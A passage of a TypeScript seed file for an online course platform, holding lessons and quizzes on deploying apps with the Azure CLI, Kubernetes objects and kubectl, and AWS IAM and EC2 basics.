          options: ['Only physical hardware', 'The OS, runtime, and scaling', 'Nothing, you manage everything', 'Only your application code'],
          answer: 'The OS, runtime, and scaling',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A ____ is a logical container that groups related Azure resources together.',
          options: [],
          answer: 'resource group',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Every Azure resource belongs to exactly one resource group.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Resource Groups and the Azure CLI',
    content: lessonContent(
      'Resource Groups and the Azure CLI',
      `The **Azure CLI** (\`az\`) lets you create and manage resources from the command line, scriptable and repeatable, unlike clicking through the Portal.\n\n\`\`\`bash\naz login\n\naz group create --name kodstigen-rg --location westeurope\n\naz group list --output table\n\naz group delete --name kodstigen-rg\n\`\`\`\n\n## Reading the commands\n\n- \`az login\` opens a browser to authenticate the CLI with your Azure account.\n- \`az group create\` makes a new resource group in a chosen **region** (\`--location\`).\n- \`--output table\` formats results as a readable table instead of raw JSON, useful while exploring.\n- \`az group delete\` removes the resource group **and everything inside it**, a fast way to clean up when you're done experimenting.\n\n> [!WARNING]\n> Deleting a resource group deletes every resource inside it permanently. It's convenient for cleanup, but double-check the name before you run it.`
    ),
    quiz: {
      title: 'Azure CLI Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which command authenticates the Azure CLI with your account?',
          options: ['az auth', 'az login', 'az connect', 'az signin'],
          answer: 'az login',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'az group create uses the ____ flag to pick which region the resource group lives in.',
          options: [],
          answer: '--location',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Deleting a resource group only deletes the group itself, leaving the resources inside it untouched.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Deploying a Web App with Azure App Service',
    content: lessonContent(
      'Deploying a Web App with Azure App Service',
      `**Azure App Service** is a fully-managed PaaS for hosting web apps and APIs, you push your code, Azure handles the servers, scaling, and patching.\n\n\`\`\`bash\naz webapp up \\\n  --name kodstigen-demo-app \\\n  --resource-group kodstigen-rg \\\n  --runtime "NODE:20-lts"\n\`\`\`\n\n\`az webapp up\` is a convenience command, it creates an App Service plan and web app if they don't exist yet, then deploys your current folder's code to it in one step.\n\n## Key concepts\n\n- An **App Service Plan** defines the underlying compute (how much CPU/RAM, how many instances), think of it as the "size" of the box your app runs in.\n- A **Web App** is the actual application running on that plan, you can run multiple web apps on one plan.\n- Once deployed, your app is reachable at \`https://<app-name>.azurewebsites.net\`.\n\n\`\`\`bash\naz webapp log tail --name kodstigen-demo-app --resource-group kodstigen-rg\n\`\`\`\n\n\`log tail\` streams your app's live logs, the first thing to check when a deployment doesn't behave as expected.`
    ),
    quiz: {
      title: 'App Service Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does an App Service Plan define?',
          options: [
            'The domain name of your app',
            'The underlying compute size and capacity your app runs on',
            'The programming language only',
            'The database connection string',
          ],
          answer: 'The underlying compute size and capacity your app runs on',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A deployed web app is reachable at https://<app-name>.____.net by default.',
          options: [],
          answer: 'azurewebsites',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Multiple web apps can run on the same App Service Plan.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Storing Data with Azure Storage',
    content: lessonContent(
      'Storing Data with Azure Storage',
      `**Azure Storage** is a family of services for storing files, structured data, and messages at scale. The one you'll reach for most often is **Blob Storage**, built for unstructured files like images, videos, backups, and documents.\n\n## The hierarchy\n\n- A **storage account**, the top-level container for all your storage services.\n- **Containers**, similar to folders, group related blobs together.\n- **Blobs**, the actual files themselves.\n\n\`\`\`bash\naz storage account create --name kodstigenstorage --resource-group kodstigen-rg --sku Standard_LRS\n\naz storage container create --name uploads --account-name kodstigenstorage\n\naz storage blob upload --account-name kodstigenstorage --container-name uploads --name photo.jpg --file ./photo.jpg\n\`\`\`\n\n## When to use what\n\n| Service | Best for |\n|---|---|\n| Blob Storage | Files: images, videos, backups, static website assets |\n| Table Storage | Simple key-value / NoSQL data at massive scale |\n| Queue Storage | Passing messages between parts of an application |\n\n\`--sku Standard_LRS\` picks a pricing/redundancy tier, "Locally Redundant Storage", the cheapest option, keeping multiple copies within one data center.`
    ),
    quiz: {
      title: 'Storage Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which Azure Storage service is best suited for storing image and video files?',
          options: ['Table Storage', 'Queue Storage', 'Blob Storage', 'App Service'],
          answer: 'Blob Storage',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Inside a storage account, blobs are grouped into ____, similar to folders.',
          options: [],
          answer: 'containers',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A storage account is the top-level container that holds all of your storage services.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Azure Databases: Azure SQL and Cosmos DB',
    content: lessonContent(
      'Azure Databases: Azure SQL and Cosmos DB',
      `Rather than running your own database server on a VM, Azure offers fully-managed database services, Azure handles patching, backups, and failover for you.\n\n## Azure SQL Database\n\nA managed, relational SQL Server database, a good fit if your data has a stable, well-defined schema.\n\n\`\`\`bash\naz sql server create --name kodstigen-sql --resource-group kodstigen-rg --admin-user sqladmin --admin-password "P@ssword123!"\n\naz sql db create --name kodstigen-db --server kodstigen-sql --resource-group kodstigen-rg --service-objective S0\n\`\`\`\n\n## Azure Cosmos DB\n\nA globally distributed, multi-model NoSQL database, if the flexible, document-style data you worked with in MongoDB sounded appealing, Cosmos DB even offers an API that speaks MongoDB's wire protocol.\n\n\`\`\`bash\naz cosmosdb create --name kodstigen-cosmos --resource-group kodstigen-rg --kind GlobalDocumentDB\n\`\`\`\n\n## Which one?\n\n| | Azure SQL Database | Cosmos DB |\n|---|---|---|\n| Data shape | Rows and columns | Flexible documents |\n| Best for | Structured, relational data | High-scale, globally distributed apps |\n| Query language | T-SQL | SQL-like, or MongoDB/Cassandra/Gremlin APIs |\n\n> [!NOTE]\n> Both services are billed based on the capacity/tier you provision, always check the pricing tier before creating one, it's easy to leave an expensive tier running by accident.`
    ),
    quiz: {
      title: 'Azure Databases Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which managed Azure database is the best fit for structured, relational data queried with T-SQL?',
          options: ['Cosmos DB', 'Azure SQL Database', 'Blob Storage', 'Queue Storage'],
          answer: 'Azure SQL Database',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Azure ____ DB is a globally distributed, multi-model NoSQL database that can even speak the MongoDB wire protocol.',
          options: [],
          answer: 'Cosmos',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Using a managed database service means Azure handles patching and backups for you.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Final Project: Deploy a Full App to Azure',
    content: lessonContent(
      'Final Project: Deploy a Full App to Azure',
      `Time to put a real application live on Azure.\n\n## Requirements\n\n1. Create a resource group for the project using the Azure CLI.\n2. Deploy a web app (frontend, API, or full-stack) to Azure App Service using \`az webapp up\` or your CI/CD tool of choice.\n3. Create a storage account and use Blob Storage for at least one piece of user-uploaded or generated content (an image, a file export, etc.).\n4. Confirm the deployed app is reachable at its \`azurewebsites.net\` URL and actually uses the storage account.\n5. Use \`az webapp log tail\` at least once to debug something during deployment.\n\n## Stretch goals\n\n- Add an Azure SQL Database or Cosmos DB instance and connect your app to it.\n- Set an environment variable/app setting on the Web App via the CLI instead of the Portal.\n- Clean up by deleting the resource group when you're done, and confirm everything inside it is gone.\n\nSubmit your repository link (or a link to your deployed app) below when you are done, an instructor will review it before you can mark this lesson complete. Good luck! 🚀`
    ),
    requiresSubmission: true,
  },
];

const kubernetesLessons: SeedLesson[] = [
  {
    title: 'Why Kubernetes? Pods and the Control Plane',
    content: lessonContent(
      'Why Kubernetes? Pods and the Control Plane',
      `Docker gets a single container running reliably. **Kubernetes** (often shortened to "k8s") is what takes over once you have many containers, across many machines, that need to be scheduled, restarted when they crash, scaled up and down, and discovered by each other automatically.\n\n## The problem Kubernetes solves\n\nRunning a handful of containers by hand with \`docker run\` works fine on one machine. It falls apart once you have:\n- Multiple machines (a **cluster**) to spread containers across.\n- Containers that need to be automatically restarted if they crash or a machine dies.\n- A need to scale a service from 2 replicas to 20 during a traffic spike.\n- Services that need to find and talk to each other without hardcoded IP addresses.\n\nKubernetes is a **container orchestrator**: you declare the desired state ("I want 3 replicas of this container running"), and Kubernetes continuously works to make reality match that declaration.\n\n## The control plane and nodes\n\nA cluster has two kinds of machines:\n\n| | Control plane | Worker nodes |\n|---|---|---|\n| Job | Decides *what* should run *where* | Actually runs the containers |\n| Key components | API server, scheduler, controller manager, etcd | kubelet, kube-proxy, container runtime |\n\n- The **API server** is the front door, every \`kubectl\` command and every internal component talks to Kubernetes through it.\n- **etcd** is the cluster's database, the single source of truth for the desired state.\n- The **scheduler** decides which node a new Pod should run on (based on available resources, constraints, etc).\n- The **kubelet** runs on every worker node and makes sure the containers the control plane assigned to that node are actually running.\n\n## Pods: the smallest deployable unit\n\nYou don't deploy a container directly in Kubernetes, you deploy a **Pod**, a wrapper around one or more containers that always run together on the same node and share networking/storage.\n\n\`\`\`yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  name: hello-pod\nspec:\n  containers:\n    - name: hello\n      image: nginx:latest\n      ports:\n        - containerPort: 80\n\`\`\`\n\nMost Pods run exactly one container, the "multiple containers" case is for tightly-coupled helpers (like a logging sidecar) that genuinely need to share a network namespace and disk with the main container.\n\n> [!NOTE]\n> You'll rarely create a bare Pod directly in a real project, almost everything is managed through a **Deployment** (next lesson), which creates and manages Pods for you and handles restarts, scaling, and rollouts.`
    ),
    quiz: {
      title: 'Kubernetes Basics Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is a Pod in Kubernetes?',
          options: [
            'A single physical machine',
            'The smallest deployable unit, wrapping one or more containers',
            "A backup of the cluster's database",
            'A type of load balancer',
          ],
          answer: 'The smallest deployable unit, wrapping one or more containers',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "Which control plane component is the single source of truth for the cluster's desired state?",
          options: ['kubelet', 'etcd', 'kube-proxy', 'Docker'],
          answer: 'etcd',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Every kubectl command and internal component talks to the cluster through the API server.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: "The control plane component responsible for deciding which node a new Pod runs on is the ____.",
          options: [],
          answer: 'scheduler',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'In a real project, you should almost always create bare Pods directly instead of using a Deployment.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The component that runs on every worker node and ensures its assigned containers are actually running is the ____.',
          options: [],
          answer: 'kubelet',
        },
      ],
    },
  },
  {
    title: 'Deployments and ReplicaSets',
    content: lessonContent(
      'Deployments and ReplicaSets',
      `Bare Pods have no self-healing: if a Pod's node dies, that Pod is gone for good. A **Deployment** is the standard way to run and manage Pods in practice, it describes a desired state and Kubernetes continuously reconciles reality to match it.\n\n## Declaring a Deployment\n\n\`\`\`yaml\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: web\n  template:\n    metadata:\n      labels:\n        app: web\n    spec:\n      containers:\n        - name: web\n          image: myregistry/web:1.4.0\n          ports:\n            - containerPort: 8080\n\`\`\`\n\n- \`replicas: 3\` declares you always want 3 copies of this Pod running.\n- \`selector\`/\`template.metadata.labels\` must match, this is how the Deployment knows which Pods belong to it.\n- \`template\` is effectively a Pod spec, the Deployment stamps out Pods from this template.\n\n## ReplicaSets: the mechanism underneath\n\nA Deployment doesn't manage Pods directly, it manages a **ReplicaSet**, which is the thing that actually watches the Pod count and creates/deletes Pods to match \`replicas\`. You'll almost never create a ReplicaSet by hand, but understanding it explains what's happening when you list resources:\n\n\`\`\`bash\nkubectl get deployments\nkubectl get replicasets\nkubectl get pods\n\`\`\`\n\nEach layer exists for a reason: the Deployment adds **rollout history and rolling updates** on top of what a plain ReplicaSet can do.\n\n## Rolling updates\n\nChange the image tag and re-apply, and the Deployment performs a **rolling update** by default: it spins up new Pods with the new version, waits for them to become healthy, then terminates old Pods, a few at a time, so the service never has zero healthy replicas.\n\n\`\`\`bash\nkubectl set image deployment/web web=myregistry/web:1.5.0\nkubectl rollout status deployment/web\nkubectl rollout undo deployment/web   # roll back if something's wrong\n\`\`\`\n\n> [!TIP]\n> \`kubectl rollout undo\` is your emergency brake, it re-applies the previous ReplicaSet's Pod template immediately, no need to remember or re-type the old image tag.`
    ),
    quiz: {
      title: 'Deployments Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does a Deployment actually manage under the hood?',
          options: [
            'Pods directly, with no intermediate resource',
            'A ReplicaSet, which manages the Pods',
            'Nodes',
            'The API server',
          ],
          answer: 'A ReplicaSet, which manages the Pods',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The ____ field in a Deployment spec declares how many copies of the Pod should always be running.',
          options: [],
          answer: 'replicas',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'By default, a Deployment updates all Pods to a new image simultaneously, causing brief downtime.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which command rolls back a Deployment to its previous version?',
          options: ['kubectl rollout undo', 'kubectl delete deployment', 'kubectl get rollback', 'kubectl apply --previous'],
          answer: 'kubectl rollout undo',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "The selector and the Pod template's labels must match for a Deployment to know which Pods belong to it.",
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'kubectl rollout ____ deployment/web shows the live progress of an ongoing rollout.',
          options: [],
          answer: 'status',
        },
      ],
    },
  },
  {
    title: 'Services and Networking',
    content: lessonContent(
      'Services and Networking',
      `Pods are ephemeral, when one is replaced (a rollout, a crash, a rescheduled Pod), it gets a **brand new IP address**. Nothing that depends on a Pod's IP directly would survive that. A **Service** gives a stable network identity in front of a changing set of Pods.\n\n## Why you can't just use Pod IPs\n\n\`\`\`\nPod IP: 10.244.1.7  →  crashes, replaced  →  new Pod IP: 10.244.2.3\n\`\`\`\n\nAnything that hardcoded \`10.244.1.7\` breaks the moment that Pod is replaced. A Service solves this with a stable virtual IP and DNS name that automatically routes to whichever Pods currently match its selector.\n\n## Defining a Service\n\n\`\`\`yaml\napiVersion: v1\nkind: Service\nmetadata:\n  name: web\nspec:\n  selector:\n    app: web\n  ports:\n    - port: 80\n      targetPort: 8080\n\`\`\`\n\n\`selector: app: web\` means this Service load-balances traffic across every Pod carrying that label, exactly the same label used by the Deployment's template. Other Pods in the cluster can now reach this Service at the DNS name \`web\` (or \`web.<namespace>.svc.cluster.local\` in full).\n\n## Service types\n\n| Type | What it does |\n|---|---|\n| \`ClusterIP\` (default) | Only reachable from inside the cluster |\n| \`NodePort\` | Also exposes a fixed port on every node's IP |\n| \`LoadBalancer\` | Asks the cloud provider to provision an external load balancer |\n\nMost internal, service-to-service traffic uses \`ClusterIP\`, you only reach for \`LoadBalancer\` for something the outside world needs to hit directly, like a public-facing web frontend.\n\n## Labels and selectors tie it all together\n\nLabels are simple key-value pairs attached to any Kubernetes object, and selectors are how Deployments, Services, and other resources find the right Pods to act on:\n\n\`\`\`yaml\nlabels:\n  app: web\n  environment: production\n\`\`\`\n\n> [!WARNING]\n> A Service with a selector that doesn't match any Pod's labels silently "works" (it exists and has a DNS name), but routes traffic to nowhere, an extremely common, very confusing first Kubernetes bug. Always double check the label spelling matches exactly on both sides.`
    ),
    quiz: {
      title: 'Services & Networking Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "Why can't other parts of your app just rely on a Pod's IP address directly?",
          options: [
            'Pod IPs never change',
            "A Pod's IP changes every time it's replaced",
            "Pods don't have IP addresses",
            'IP addresses are deprecated in Kubernetes',
          ],
          answer: "A Pod's IP changes every time it's replaced",
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which Service type is only reachable from inside the cluster?',
          options: ['NodePort', 'LoadBalancer', 'ClusterIP', 'ExternalName'],
          answer: 'ClusterIP',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A Service routes traffic to Pods based on matching labels via a selector.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A Service with a selector that matches no Pods will exist but route traffic to ____.',
          options: [],
          answer: 'nowhere',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which Service type asks the cloud provider to provision an external load balancer?',
          options: ['ClusterIP', 'NodePort', 'LoadBalancer', 'Ingress'],
          answer: 'LoadBalancer',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Labels are a Kubernetes field that only Services can use.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'ConfigMaps, Secrets, and Volumes',
    content: lessonContent(
      'ConfigMaps, Secrets, and Volumes',
      `Hardcoding configuration (URLs, feature flags, credentials) directly into a container image means rebuilding the image every time a setting changes, and it means secrets end up baked into an image anyone with registry access can pull. Kubernetes externalizes this with **ConfigMaps**, **Secrets**, and **Volumes**.\n\n## ConfigMaps: non-sensitive configuration\n\n\`\`\`yaml\napiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: web-config\ndata:\n  LOG_LEVEL: 'info'\n  FEATURE_NEW_CHECKOUT: 'true'\n\`\`\`\n\n\`\`\`yaml\n# inside a Pod spec\ncontainers:\n  - name: web\n    image: myregistry/web:1.5.0\n    envFrom:\n      - configMapRef:\n          name: web-config\n\`\`\`\n\n\`envFrom\`/\`configMapRef\` injects every key in the ConfigMap as an environment variable, change the ConfigMap and restart the Pods, no image rebuild required.\n\n## Secrets: the same idea, for sensitive values\n\n\`\`\`yaml\napiVersion: v1\nkind: Secret\nmetadata:\n  name: db-credentials\ntype: Opaque\ndata:\n  password: cGFzc3dvcmQxMjM=   # base64-encoded, NOT encrypted\n\`\`\`\n\n> [!WARNING]\n> Secret values are **base64-encoded, not encrypted**, by default, anyone who can read the Secret object can trivially decode it. Real production clusters pair Secrets with encryption-at-rest and tools like a proper secrets manager (Vault, AWS Secrets Manager, sealed-secrets) rather than relying on the base64 encoding for actual protection.\n\n## Volumes: storage that outlives a container\n\nA container's own filesystem disappears the moment it restarts. A **Volume** attaches storage to a Pod that can persist across container restarts (or even be shared between containers in the same Pod).\n\n\`\`\`yaml\nspec:\n  containers:\n    - name: web\n      image: myregistry/web:1.5.0\n      volumeMounts:\n        - name: cache-data\n          mountPath: /var/cache/app\n  volumes:\n    - name: cache-data\n      emptyDir: {}\n\`\`\`\n\n\`emptyDir\` survives container restarts within the same Pod, but is deleted when the Pod itself is removed. For storage that must outlive the Pod entirely (a database's data directory), you'd use a **PersistentVolumeClaim** instead, which requests storage from the cluster that exists independently of any one Pod's lifecycle.`
    ),
    quiz: {
      title: 'Config & Storage Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is the main purpose of a ConfigMap?',
          options: [
            'Storing encrypted secrets',
            'Storing non-sensitive configuration outside the container image',
            'Scheduling Pods',
            'Load balancing traffic',
          ],
          answer: 'Storing non-sensitive configuration outside the container image',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "Kubernetes Secret values are encrypted by default, so anyone who can read the object can't see the real value.",
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Secret values are stored ____-encoded by default, which is not the same as encryption.',
          options: [],
          answer: 'base64',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "What happens to an emptyDir volume's contents when its Pod is deleted?",
          options: [
            'They persist forever',
            'They are deleted along with the Pod',
            'They are automatically backed up to S3',
            'Nothing, emptyDir cannot be deleted',
          ],
          answer: 'They are deleted along with the Pod',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "Changing a ConfigMap's values requires rebuilding the container image.",
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: "For storage that must outlive a Pod entirely, like a database's data directory, you'd use a Persistent Volume ____ instead of a plain volume.",
          options: [],
          answer: 'Claim',
        },
      ],
    },
  },
  {
    title: 'kubectl and Working with a Real Cluster',
    content: lessonContent(
      'kubectl and Working with a Real Cluster',
      `Everything so far has been YAML in the abstract. This lesson is the hands-on toolkit: \`kubectl\`, the command-line tool for talking to a cluster, and how to get a real (if small) cluster running on your own machine.\n\n## Getting a local cluster\n\nYou don't need a cloud account to learn Kubernetes. Tools like **minikube** and **kind** (Kubernetes IN Docker) run a real, small cluster locally:\n\n\`\`\`bash\n# minikube\nminikube start\n\n# or kind\nkind create cluster\n\`\`\`\n\nBoth give you a fully functional \`kubectl\` context pointed at a local cluster in a couple of minutes.\n\n## Core kubectl commands\n\n\`\`\`bash\nkubectl apply -f deployment.yaml   # create or update a resource from a YAML file\nkubectl get pods                    # list resources\nkubectl get pods -o wide            # list with extra detail (node, IP)\nkubectl describe pod web-7d9f8      # detailed info + recent events, great for debugging\nkubectl logs web-7d9f8              # see a container's stdout/stderr\nkubectl logs web-7d9f8 -f            # follow logs live\nkubectl exec -it web-7d9f8 -- sh    # get an interactive shell inside a running container\nkubectl delete -f deployment.yaml   # tear down what that file created\n\`\`\`\n\n\`kubectl describe\` is usually the first thing to reach for when something isn't working, its **Events** section at the bottom often tells you exactly why a Pod won't schedule or start (out of resources, image pull failure, failed health check, etc).\n\n## Namespaces: dividing a cluster\n\nA **namespace** is a way to partition a single cluster into logical groups, commonly one per environment or team:\n\n\`\`\`bash\nkubectl create namespace staging\nkubectl apply -f deployment.yaml -n staging\nkubectl get pods -n staging\nkubectl get pods --all-namespaces\n\`\`\`\n\nResource names only need to be unique **within** a namespace, so \`staging\` and \`production\` can each have their own \`web\` Deployment without colliding.\n\n> [!TIP]\n> \`kubectl apply\` is declarative and safe to re-run, if nothing changed in the YAML, re-applying it is a no-op. This is why CI/CD pipelines for Kubernetes almost always just run \`kubectl apply -f .\` on every deploy rather than tracking what's "new" vs "changed" themselves.`
    ),
    quiz: {
      title: 'kubectl Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which local tool lets you run a real Kubernetes cluster without a cloud account?',
          options: ['kubectl', 'minikube or kind', 'Docker Compose', 'AWS CLI'],
          answer: 'minikube or kind',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'kubectl ____ pod-name shows detailed info and recent events for a Pod, the best first stop when debugging.',
          options: [],
          answer: 'describe',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Resource names must be unique across the entire cluster, even across different namespaces.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which command gets you an interactive shell inside a running container?',
          options: ['kubectl logs', 'kubectl describe', 'kubectl exec -it ... -- sh', 'kubectl get pods'],
          answer: 'kubectl exec -it ... -- sh',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Re-running kubectl apply -f on an unchanged YAML file is safe and effectively a no-op.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'kubectl create ____ staging creates a new logical partition of the cluster for grouping resources.',
          options: [],
          answer: 'namespace',
        },
      ],
    },
  },
  {
    title: 'Final Project: Deploy a Multi-Tier App to Kubernetes',
    content: lessonContent(
      'Final Project: Deploy a Multi-Tier App to Kubernetes',
      `Put every piece together: Deployments, Services, config, and real \`kubectl\` usage, applied to an actual multi-tier application.\n\n## Requirements\n\n1. Containerize a simple app with at least two tiers (e.g. a web/API service and a database, or a frontend and a backend), each with its own Dockerfile.\n2. Write a Deployment + Service for each tier, the backend/API's Service should be \`ClusterIP\` (internal only), the frontend's should be exposed (\`NodePort\` or \`LoadBalancer\`, depending on your cluster).\n3. Externalize at least one piece of configuration into a ConfigMap and one credential into a Secret, referenced by your Deployments rather than hardcoded.\n4. Deploy everything to a local cluster (minikube or kind) using \`kubectl apply -f\`, and confirm the frontend can actually reach the backend through its Service DNS name.\n5. Perform a rolling update, change something in your app, rebuild the image, bump the tag, and re-apply, then verify with \`kubectl rollout status\` that it completed without downtime.\n\n## Stretch goals\n\n- Add a liveness and readiness probe to at least one Deployment.\n- Use a PersistentVolumeClaim for the database tier's data directory so data survives a Pod restart.\n- Split your environment into two namespaces (e.g. \`staging\` and \`production\`) using the same YAML with different config.\n\nSubmit a link to your finished project (a repo with your YAML manifests, or a recording/write-up of it running) below, an instructor will review it before you can mark this lesson complete. Good luck! 🚀`
    ),
    requiresSubmission: true,
  },
];

const awsLessons: SeedLesson[] = [
  {
    title: 'Why AWS? Regions, Availability Zones, and IAM',
    content: lessonContent(
      'Why AWS? Regions, Availability Zones, and IAM',
      `**AWS (Amazon Web Services)** rents out compute, storage, networking, and dozens of higher-level services on demand, instead of buying and racking your own servers, you provision what you need in minutes and pay for what you use.\n\n## Regions and Availability Zones\n\nAWS infrastructure is organized geographically:\n\n| Concept | What it is |\n|---|---|\n| **Region** | A geographic area (e.g. \`us-east-1\`, \`eu-north-1\`), fully independent of other regions |\n| **Availability Zone (AZ)** | One or more physically separate data centers within a region |\n\nA region typically has 3+ AZs. Spreading resources across multiple AZs is the standard way to survive a single data center failure without any downtime, if one AZ has a power outage, your app keeps running in the others.\n\n## IAM: Identity and Access Management\n\n**IAM** controls *who* (or *what*) can do *what* in your AWS account. Getting this right is one of the most important skills in AWS, misconfigured IAM is behind a huge share of real-world cloud security incidents.\n\n- **Users**: an identity for a person, with long-lived credentials.\n- **Roles**: a set of permissions that something can *assume* temporarily, EC2 instances, Lambda functions, and even users from another AWS account can assume a role instead of using long-lived credentials.\n- **Policies**: JSON documents that actually define permissions, attached to users, roles, or groups.\n\n\`\`\`json\n{\n  "Version": "2012-10-17",\n  "Statement": [\n    {\n      "Effect": "Allow",\n      "Action": "s3:GetObject",\n      "Resource": "arn:aws:s3:::my-bucket/*"\n    }\n  ]\n}\n\`\`\`\n\nThis policy allows reading objects from one specific S3 bucket, nothing else. This is the **principle of least privilege**: grant exactly the permissions something needs, and nothing more.\n\n> [!WARNING]\n> Never use your AWS account's root user for everyday work, and never hardcode long-lived access keys into application code. Create an IAM user (or better, a role) with only the permissions a task actually needs.`
    ),
    quiz: {
      title: 'AWS Basics Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is an Availability Zone?',
          options: [
            'A pricing tier',
            'One or more physically separate data centers within a region',
            'A type of IAM policy',
            'A backup region on another continent',
          ],
          answer: 'One or more physically separate data centers within a region',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "What does an IAM Role let you do that a long-lived IAM user credential doesn't?",
          options: [
            'Nothing, they are identical',
            'Be assumed temporarily by a service or another account without long-lived credentials',
            'Automatically create S3 buckets',
            'Bypass all billing',
          ],
          answer: 'Be assumed temporarily by a service or another account without long-lived credentials',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Spreading resources across multiple Availability Zones helps an app survive a single data center failure.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The principle of ____ privilege means granting exactly the permissions something needs, and nothing more.',
          options: [],
          answer: 'least',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "It's a recommended practice to use the AWS account's root user for everyday development work.",
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What actually defines the specific permissions granted to a user, role, or group?',
          options: ['A Region', 'An Availability Zone', 'A Policy', 'A VPC'],
          answer: 'A Policy',
        },
      ],
    },
  },
  {
    title: 'EC2: Virtual Servers in the Cloud',
    content: lessonContent(
      'EC2: Virtual Servers in the Cloud',
      `**EC2 (Elastic Compute Cloud)** rents virtual machines, called **instances**, by the second. It's the most fundamental AWS compute service, and the one most other services are conceptually built on top of.\n\n## Launching an instance\n\nEvery EC2 instance starts from an **AMI (Amazon Machine Image)**, a template that includes an operating system and optionally pre-installed software. AWS provides official AMIs (Amazon Linux, Ubuntu, Windows Server), and you can create your own from a configured instance to reuse later.\n\nKey choices when launching an instance:\n- **Instance type** (e.g. \`t3.micro\`, \`m5.large\`), determines vCPUs, memory, and network performance. The letter is the family (general purpose, compute-optimized, memory-optimized...), the number is the generation, the suffix is the size.\n- **Key pair**, an SSH key you use to log in, AWS never stores your private key.\n- **Security group**, a virtual firewall controlling what traffic can reach the instance.\n\n## Security groups\n\n\`\`\`\nInbound rules:\n  - Port 22 (SSH)  from 203.0.113.4/32   (your IP only)\n  - Port 443 (HTTPS) from 0.0.0.0/0       (anyone)\n\nOutbound rules:\n  - All traffic to 0.0.0.0/0\n\`\`\`\n\nSecurity groups are **stateful**: if you allow inbound traffic on a port, the matching response traffic is automatically allowed out, you don't need a separate outbound rule for replies. They're also **allow-only**, you can't write an explicit "deny" rule, only choose what to allow.\n\n## Elastic IPs\n\nA regular EC2 instance's public IP changes if you stop and start it. An **Elastic IP** is a static public IP you allocate to your account and attach to an instance, giving you a stable address that survives stop/start cycles (though it costs a small amount if it's allocated but not attached to a running instance, to discourage hoarding unused addresses).\n\n> [!TIP]\n> For anything long-running and public-facing, put a load balancer in front of your EC2 instances instead of relying on a single instance's Elastic IP, that way you can add/replace instances without ever changing the address your users hit.`
    ),
    quiz: {
